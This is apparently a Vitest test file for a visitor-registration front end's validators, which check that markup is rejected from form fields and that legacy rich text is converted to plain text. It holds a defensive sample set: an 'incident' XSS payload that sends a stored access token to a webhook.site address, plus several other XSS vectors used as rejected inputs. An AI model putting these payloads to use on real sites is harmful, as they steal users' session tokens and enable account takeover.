import { describe, expect, it } from "vitest";
import { htmlToPlainText, isSafePlainText, validateSafeText } from "./safeText";
import {
  validateCustomFieldValues,
  validateField,
  validateFieldText,
} from "./validationUtils";

const INCIDENT_PAYLOAD =
  `<svg onload="fetch('https://webhook.site/d011c1e7?at='+` +
  `encodeURIComponent(localStorage.getItem('accessToken')))">`;

describe("isSafePlainText (mirrors backend safe-text.util.ts)", () => {
  it.each([
    INCIDENT_PAYLOAD,
    "<img src=x onerror=alert(1)>",
    "<ScRiPt>alert(1)</sCrIpT>",
    "&lt;svg onload=alert(1)&gt;",
    "&#60;svg&#62;",
    "＜svg onload=alert(1)＞",
    'x" onmouseover="alert(1)',
    "JavaScript:alert(1)",
    "data:text/html,<b>x</b>",
    "Jane\u0000Visitor",
  ])("rejects %p", (value) => {
    expect(isSafePlainText(value)).toBe(false);
  });

  it.each([
    "Jane Visitor",
    "O'Brien & Sons",
    "Meeting re: Q3 budget\nSecond line",
    "محمد البلوشي",
    "AB 12345",
  ])("accepts %p", (value) => {
    expect(isSafePlainText(value)).toBe(true);
  });
});

describe("validateSafeText", () => {
  it("uses the same wording as the backend", () => {
    expect(validateSafeText('<svg onload="fetch"/>', "Full name")).toBe(
      "Full name cannot contain markup or code, such as < or > characters",
    );
    expect(validateSafeText("x".repeat(201), "Full name")).toBe(
      "Full name must be at most 200 characters",
    );
  });

  it("ignores empty and non-string values", () => {
    expect(validateSafeText("", "Name")).toBeNull();
    expect(validateSafeText(undefined, "Name")).toBeNull();
    expect(validateSafeText(42, "Name")).toBeNull();
  });
});

describe("validateField applies the markup rule to every custom field type", () => {
  it.each(["text", "textarea", "email", "phone", "number", "select", "radio", "country", "date", "time"])(
    "rejects markup in a %s field",
    (inputType) => {
      expect(
        validateField({ label: "Field", inputName: "field", inputType }, "<svg onload=x>"),
      ).toMatch(/cannot contain markup/);
    },
  );

  it("checks every checkbox item", () => {
    expect(
      validateField(
        { label: "Interests", inputType: "checkbox", values: ["A", "<b>"] },
        ["A", "<b>"],
      ),
    ).toMatch(/cannot contain markup/);
  });

  it("applies per-type limits", () => {
    expect(validateField({ label: "Name", inputType: "text" }, "x".repeat(201))).toBe(
      "Name must be at most 200 characters",
    );
    expect(
      validateField({ label: "Notes", inputType: "textarea" }, "x".repeat(2000)),
    ).toBeNull();
  });

  it("does not restrict passwords", () => {
    expect(
      validateField({ label: "Password", inputType: "password", required: true }, "p<a>ss&lt;1"),
    ).toBeNull();
  });

  it("matches backend number, date, time, and country formats", () => {
    expect(validateField({ label: "Oman ID", inputType: "number" }, "012345678")).toBeNull();
    expect(validateField({ label: "Oman ID", inputType: "number" }, "1e5")).toBe(
      "Oman ID must be a number",
    );
    expect(
      validateField({ label: "Passport number", inputType: "number" }, "AB1234567"),
    ).toBeNull();
    expect(validateField({ label: "Visit date", inputType: "date" }, "2026-13-45")).toMatch(
      /valid date/,
    );
    expect(validateField({ label: "Arrival", inputType: "time" }, "25:00")).toMatch(/valid time/);
    expect(validateField({ label: "Country", inputType: "country" }, "OMN")).toMatch(
      /2-letter country code/,
    );
  });
});

describe("validateCustomFieldValues", () => {
  const fields = [
    { fieldKey: "full_name", label: "Full name", inputType: "text" },
    { field_key: "notes", label: "Notes", input_type: "textarea" },
  ];

  it("reports the offending field with its configured label", () => {
    expect(
      validateCustomFieldValues(fields, { full_name: "Jane", notes: INCIDENT_PAYLOAD }),
    ).toEqual({
      notes: "Notes cannot contain markup or code, such as < or > characters",
    });
  });

  it("still checks keys that have no field definition", () => {
    expect(validateCustomFieldValues(fields, { legacy_key: "<b>" })).toEqual({
      legacy_key: "legacy_key cannot contain markup or code, such as < or > characters",
    });
  });

  it("accepts clean values", () => {
    expect(validateCustomFieldValues(fields, { full_name: "Jane", notes: "Hi" })).toEqual({});
  });

  it("exposes the single-value helper used by the returning-visitor form", () => {
    expect(validateFieldText({ label: "Oman ID", inputType: "number" }, "<b>")).toMatch(
      /cannot contain markup/,
    );
  });
});

describe("htmlToPlainText (legacy rich-text textarea values)", () => {
  it("turns saved rich-text HTML into plain text that passes the markup rule", () => {
    const converted = htmlToPlainText("<p>Visiting for <strong>audit</strong></p><p>Floor 2 &amp; 3</p>");
    expect(converted).toBe("Visiting for audit\nFloor 2 & 3");
    expect(isSafePlainText(converted)).toBe(true);
  });

  it("drops script content markers from the stored markup", () => {
    expect(isSafePlainText(htmlToPlainText('<p>Hi</p><svg onload="fetch(1)"></svg>'))).toBe(true);
  });

  it("leaves plain text and non-strings unchanged", () => {
    expect(htmlToPlainText("Plain note")).toBe("Plain note");
    expect(htmlToPlainText(undefined)).toBeUndefined();
    expect(htmlToPlainText(["a"])).toEqual(["a"]);
  });
});
